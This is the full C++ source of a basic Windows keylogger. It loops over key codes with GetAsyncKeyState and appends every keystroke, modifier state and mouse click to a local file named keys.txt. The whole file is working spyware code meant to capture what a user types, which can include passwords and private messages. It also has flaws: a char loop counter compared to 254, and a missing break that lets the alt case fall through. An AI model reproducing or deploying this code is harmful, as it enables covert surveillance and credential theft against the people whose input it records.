#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream> 

using namespace std;
std::string line;
int currentLine = 0;

void Logging();

int main(){
    Logging();
}

//Way to organize
void Logging(){
    char c;
    bool caps = false;
    while (true)
    {
        for(c = 0; c <= 254; c++){
            if(GetAsyncKeyState(c) & 0x1)
            {
                ofstream log;
                log.open("keys.txt", ios::app);
                switch (c) {
                    case VK_BACK:
                        log << "[backspace]";//delete characters by getting the current line and the last character entered
                        break;
                    case VK_RETURN:
                        currentLine++;
                        log << "\n";//go to next line
                        break;
                    case VK_SHIFT:
                        if ((GetKeyState(VK_SHIFT) & 0x0001)!=0){
                            caps = true;
                            log << "[Shift Up]";
                        } else {
                            caps = false;
                            log << "[Shift Down]";
                        }
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
                            caps = true;
                            log << "[caps on]";
                        } else {
                            caps = false;
                            log << "[caps off]";
                        }
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                    case VK_LBUTTON:
                        log << "[lc]\n";
                        break;
                    case VK_RBUTTON:
                        log << "[rc]\n";
                        break;
                    default:
                        if(!caps){
                            char lc = tolower(c);
                            log << lc;
                        } else {
                            log << c;
                        }
                }
                log.close();
            }
        }
    }
}
